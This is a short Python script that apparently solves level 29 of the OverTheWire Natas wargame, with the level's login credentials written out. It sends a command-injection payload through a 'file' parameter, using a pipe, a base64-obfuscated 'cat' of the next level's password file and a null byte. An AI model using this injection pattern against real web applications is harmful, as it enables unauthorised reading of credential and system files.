import requests as req

username = "natas29"
passwd = "airooCaiseiyee8he8xongien9euhe8b"
url = "http://natas29.natas.labs.overthewire.org/index.pl"
payload = "?file=|`echo+%22Y2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczMwCg==%22|base64+-d`+%00"

r = req.get(url=url+payload, auth=(username, passwd))
print(r.text)
